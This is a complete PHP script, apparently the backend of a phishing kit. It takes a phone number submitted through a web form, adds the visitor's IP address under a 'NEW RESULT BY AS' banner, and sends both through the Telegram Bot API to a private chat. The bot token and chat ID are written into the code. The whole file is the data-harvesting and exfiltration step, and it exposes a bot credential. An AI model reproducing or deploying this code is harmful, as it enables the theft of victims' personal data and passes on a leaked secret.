<?php 

	use Telegram\Bot\Api;
	require_once('vendor/autoload.php');




	$phoneCountryCode = $_POST['phoneCountryCode'];
	$phone = $_POST["phone"];



	$num = $phoneCountryCode.$phone;
	

	$message =  "NEW RESULT BY AS"."\r\n"."==================="."\r\n"."Numéro : ".$num;
	$message2 = "";
	$message2 = $message2."\r\nIP : ".$_SERVER['REMOTE_ADDR'];



	$telegram = new Api('1093092007:AAH3mOWf1KrC-48Oo7qcY5wPqj-Wy25Giyg');


	$response = $telegram->sendMessage([
		    'chat_id' => '-1001951518881', 
		    'text' => $message."\r\n".$message2
	]);



	echo "success";


	





 ?>